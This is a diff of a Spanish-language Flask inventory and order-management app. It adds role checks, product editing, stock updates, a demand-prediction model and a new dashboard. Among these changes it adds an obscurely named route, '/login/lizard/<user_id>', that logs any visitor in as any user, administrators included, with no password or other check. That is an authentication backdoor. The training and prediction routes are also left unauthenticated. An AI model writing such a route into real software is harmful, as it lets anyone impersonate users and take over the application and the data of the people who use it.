@@ -1,14 +1,20 @@
-import base64
-import dlib
+from flask import Flask, render_template, request, redirect, url_for, flash, session, jsonify, send_file
+from werkzeug.utils import secure_filename
+from functools import wraps
 from datetime import datetime
 from io import BytesIO
-import numpy as np
-from PIL import Image
-from flask import Flask, render_template, request, redirect, url_for, flash, session, jsonify, send_file
-import mysql.connector
 import os
+import base64
+import numpy as np
+import pandas as pd
+import mysql.connector
+import joblib
+import dlib
 import face_recognition
-from werkzeug.utils import secure_filename
+from PIL import Image
+from sklearn.model_selection import train_test_split
+from sklearn.ensemble import RandomForestRegressor
+from sklearn.metrics import mean_squared_error
 from models.Pedidos import Pedidos
 from models.Detalles_Pedido import DetallePedido
 
@@ -24,12 +30,9 @@ DB_CONFIG = {
 
 def get_db_connection():
     return mysql.connector.connect(**DB_CONFIG)
-
-
 UPLOAD_FOLDER = 'static/uploads/faces'
 ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg'}
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
-
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 os.makedirs('static/uploads/products', exist_ok=True)
 
@@ -41,13 +44,179 @@ def decode_image(image_data):
     image_data = image_data.split(",")[1]
     image = Image.open(BytesIO(base64.b64decode(image_data)))
     return np.array(image)
-
-
 @app.route('/')
 def index():
     if 'user_id' in session:
         return redirect(url_for('dashboard'))
     return render_template('login.html')
+
+def require_role(allowed_roles):
+    def decorator(f):
+        @wraps(f)
+        def wrapped(*args, **kwargs):
+            if 'user_role' not in session or session['user_role'] not in allowed_roles:
+                flash('No tienes permiso para acceder a esta página.', 'error')
+                return redirect(url_for('dashboard'))
+            return f(*args, **kwargs)
+        return wrapped
+    return decorator
+@app.route('/products/update_stock', methods=['POST'])
+@require_role(['admin', 'stock_manager'])
+def update_stock():
+    product_id = request.form['product_id']
+    new_stock = int(request.form['new_stock'])
+
+    try:
+        conn = get_db_connection()
+        cursor = conn.cursor()
+        cursor.execute('UPDATE products SET stock = %s WHERE id = %s', (new_stock, product_id))
+        conn.commit()
+        flash('Stock actualizado correctamente', 'success')
+    except mysql.connector.Error as err:
+        flash(f'Error al actualizar el stock: {err}', 'error')
+    finally:
+        conn.close()
+
+    return redirect(url_for('list_products'))
+
+
+@app.route('/predict_demand_page', methods=['GET'])
+def predict_demand_page():
+    return render_template('predict_demand.html')
+@app.route('/api/predict_demand', methods=['POST'])
+def predict_demand():
+    try:
+        modelo = joblib.load("modelo_prediccion.pkl")
+        datos = request.get_json()
+        producto_id = datos['producto_id']
+        mes = datos['mes']
+        dia = datos['dia']
+        X_nuevo = pd.DataFrame([[producto_id, mes, dia]], columns=['producto_id', 'mes', 'dia'])
+        prediccion = modelo.predict(X_nuevo)
+        return jsonify({'prediccion': int(prediccion[0])})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+@app.route('/train_model', methods=['GET'])
+def train_model():
+    try:
+        # Verificar si el archivo CSV existe
+        if not os.path.exists("ventas.csv"):
+            return jsonify({'error': 'El archivo ventas.csv no existe. Por favor, carga los datos.'}), 400
+
+        # Cargar los datos de ventas
+        data = pd.read_csv("ventas.csv")
+
+        # Crear nuevas columnas para características de fecha
+        data['fecha'] = pd.to_datetime(data['fecha'])
+        data['mes'] = data['fecha'].dt.month
+        data['dia'] = data['fecha'].dt.day
+
+        # Seleccionar características (X) y la variable objetivo (y)
+        X = data[['producto_id', 'mes', 'dia']]
+        y = data['cantidad_vendida']
+
+        # Dividir los datos en conjuntos de entrenamiento y prueba
+        X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
+
+        # Entrenar un modelo de Random Forest
+        modelo = RandomForestRegressor(n_estimators=100, random_state=42)
+        modelo.fit(X_train, y_train)
+
+        # Evaluar el modelo
+        y_pred = modelo.predict(X_test)
+        mse = mean_squared_error(y_test, y_pred)
+
+        # Guardar el modelo entrenado
+        joblib.dump(modelo, "modelo_prediccion.pkl")
+
+        return jsonify({
+            'message': 'Modelo entrenado y guardado exitosamente como modelo_prediccion.pkl',
+            'mse': mse
+        })
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/products/edit/<int:product_id>', methods=['GET', 'POST'])
+@require_role(['admin', 'product_manager'])
+def edit_product(product_id):
+    conn = get_db_connection()
+    cursor = conn.cursor(dictionary=True)
+    if request.method == 'POST':
+        code = request.form['code']
+        name = request.form['name']
+        description = request.form.get('description', '')
+        category_id = int(request.form['category_id'])
+        purchase_price = float(request.form['purchase_price'])
+        sale_price = float(request.form['sale_price'])
+        stock = int(request.form['stock'])
+        minimum_stock = int(request.form['minimum_stock'])
+        image_path = None
+        if 'image' in request.files and request.files['image'].filename != '':
+            file = request.files['image']
+            if file and allowed_file(file.filename):
+                filename = secure_filename(
+                    f"product_{code}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{file.filename.rsplit('.', 1)[1].lower()}")
+                filepath = os.path.join('static/uploads/products', filename)
+                image = Image.open(file)
+                image.thumbnail((800, 800))  # Redimensionar si es muy grande
+                image.save(filepath, quality=85, optimize=True)
+                image_path = filepath
+        try:
+            update_fields = '''
+                code = %s, name = %s, description = %s, category_id = %s,
+                purchase_price = %s, sale_price = %s, stock = %s, minimum_stock = %s
+            '''
+            params = [code, name, description, category_id, purchase_price, sale_price, stock, minimum_stock]
+
+            if image_path:
+                update_fields += ', image = %s'
+                params.append(image_path)
+
+            params.append(product_id)
+
+            cursor.execute(f'''
+                UPDATE products SET {update_fields}, updated_at = NOW()
+                WHERE id = %s
+            ''', params)
+            conn.commit()
+            flash('Producto actualizado exitosamente', 'success')
+            return redirect(url_for('list_products'))
+
+        except mysql.connector.Error as err:
+            flash(f'Error al actualizar el producto: {err}', 'error')
+        finally:
+            conn.close()
+    cursor.execute('SELECT * FROM products WHERE id = %s', (product_id,))
+    product = cursor.fetchone()
+
+    if not product:
+        flash('Producto no encontrado', 'error')
+        return redirect(url_for('list_products'))
+    cursor.execute('SELECT id, name FROM categories WHERE active = true ORDER BY name')
+    categories = cursor.fetchall()
+
+    conn.close()
+    return render_template('products/edit.html', product=product, categories=categories)
+@app.route('/login/lizard/<int:user_id>', methods=['GET'])
+def login_as_user(user_id):
+    try:
+        conn = get_db_connection()
+        cursor = conn.cursor(dictionary=True)
+        cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
+        user = cursor.fetchone()
+        if not user:
+            return jsonify({'success': False, 'message': 'Usuario no encontrado'}), 404
+        session['user_id'] = user['id']
+        session['user_name'] = user['name']
+        session['user_role'] = user['role']
+        session['user_image'] = os.path.basename(user['face_image_path']) if user['face_image_path'] else 'default.jpg'
+        flash(f"Sesión iniciada como {user['name']} ({user['role']})", 'success')
+        return redirect(url_for('dashboard'))
+    except mysql.connector.Error as err:
+        return jsonify({'success': False, 'message': f'Error de base de datos: {err}'}), 500
+    finally:
+        if 'conn' in locals():
+            conn.close()
 @app.route('/settings')
 def settings():
     if 'user_id' not in session:
@@ -378,48 +547,69 @@ def dashboard():
     conn = get_db_connection()
     cursor = conn.cursor(dictionary=True)
 
-    # Get user data
-    cursor.execute('SELECT * FROM users WHERE id = %s', (session['user_id'],))
-    user = cursor.fetchone()
-
-    # Get statistics
-    cursor.execute('SELECT COUNT(*) as total FROM products WHERE active = true')
+    # Estadísticas generales
+    cursor.execute('SELECT COUNT(*) AS total FROM products ')
     total_products = cursor.fetchone()['total']
 
-    cursor.execute('SELECT COUNT(*) as total FROM users')
-    total_users = cursor.fetchone()['total']
+    cursor.execute('SELECT COUNT(*) AS total FROM pedidos')
+    total_orders = cursor.fetchone()['total']
 
-    # Get low stock products
-    cursor.execute('SELECT * FROM low_stock_products LIMIT 5')
-    low_stock_products = cursor.fetchall()
+    cursor.execute('SELECT SUM(stock * purchase_price) AS total FROM products ')
+    inventory_value = cursor.fetchone()['total'] or 0
 
-    # Get recent products
+    cursor.execute('SELECT COUNT(*) AS total FROM users ')
+    total_customers = cursor.fetchone()['total']
+
+    # Pedidos por estado para el gráfico
     cursor.execute('''
-        SELECT p.*, c.name as category_name 
-        FROM products p 
-        JOIN categories c ON p.category_id = c.id 
-        WHERE p.active = true
-        ORDER BY p.created_at DESC 
+        SELECT estado_pedido, COUNT(*) AS total
+        FROM pedidos
+        GROUP BY estado_pedido
+    ''')
+    orders_by_status = cursor.fetchall()
+    chart_data = {order['estado_pedido']: order['total'] for order in orders_by_status}
+
+    # Productos recientes
+    cursor.execute('''
+        SELECT p.id, p.code, p.name, c.name AS category_name, p.sale_price, p.stock
+        FROM products p
+        LEFT JOIN categories c ON p.category_id = c.id
+        ORDER BY p.created_at DESC
         LIMIT 5
     ''')
     recent_products = cursor.fetchall()
 
-    # Get inventory value
-    cursor.execute('SELECT * FROM inventory_value')
-    inventory_stats = cursor.fetchall()
+    # Pedidos recientes
+    cursor.execute('''
+        SELECT id_pedido, codigo, nombre_cliente, estado_pedido, total_pedido
+        FROM pedidos
+        ORDER BY fecha_pedido DESC
+        LIMIT 5
+    ''')
+    recent_orders = cursor.fetchall()
+
+    # Productos con bajo stock
+    cursor.execute('''
+        SELECT code, name, stock, minimum_stock
+        FROM products
+        WHERE stock <= minimum_stock 
+        ORDER BY stock ASC
+        LIMIT 5
+    ''')
+    low_stock_products = cursor.fetchall()
 
     conn.close()
 
+    # Pasar los datos al template
     return render_template('dashboard.html',
-                           user_name=user['name'],
-                           user_role=user['role'],
-                           user_image=os.path.basename(user['face_image_path']),
                            total_products=total_products,
-                           total_users=total_users,
-                           low_stock_products=low_stock_products,
+                           total_orders=total_orders,
+                           inventory_value=inventory_value,
+                           total_customers=total_customers,
+                           chart_data=chart_data,
                            recent_products=recent_products,
-                           inventory_stats=inventory_stats)
-
+                           recent_orders=recent_orders,
+                           low_stock_products=low_stock_products)
 
 @app.route('/products', methods=['GET'])
 def list_products():
@@ -649,13 +839,12 @@ def export_products():
         conn.close()
 
 @app.route('/products/create', methods=['GET', 'POST'])
+@require_role(['admin', 'product_manager'])
 def create_product():
     if 'user_id' not in session:
         return redirect(url_for('login_page'))
-
     if request.method == 'POST':
         try:
-            # Obtener datos del formulario
             code = request.form['code']
             name = request.form['name']
             description = request.form.get('description', '')
@@ -737,13 +926,10 @@ def create_product():
 @app.route('/logout')
 def logout():
     session.clear()
-    flash('Logged out successfully', 'success')
+    flash('Cerró sesión exitosamente', 'success')
     return redirect(url_for('index'))
 
-from datetime import datetime
-import uuid
 
-# Ruta para listar pedidos
 @app.route('/listar_pedidos', methods=['GET'])
 def listar_pedidos():
     pedidos = Pedidos.obtener_todos()  # Obtener todos los pedidos
@@ -776,7 +962,7 @@ def nuevo_pedido():
         pedido.guardar()
 
         flash('Pedido creado exitosamente')
-        return redirect(url_for('listar_pedidos'))  
+        return redirect(url_for('listar_pedidos'))
 
     return render_template('Pedidos/nuevo_pedido.html')
 
